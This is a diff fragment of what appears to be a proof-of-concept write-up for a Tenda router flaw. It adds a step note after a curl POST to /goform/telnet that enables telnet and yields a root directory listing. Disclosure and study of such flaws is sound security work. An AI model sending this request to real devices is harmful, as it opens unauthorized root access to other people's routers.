@@ -58,6 +58,7 @@ Send a POST request to the `/goform/telnet` endpoint to trigger the `TendaTelnet
 ```
 curl -i -X POST http://192.168.xxx.xxx/goform/telnet --http0.9
 ```
+then ctrl+c quit:
 ![PoC 2 Result: Root Directory Listing](./imgs/0.png)
 
 
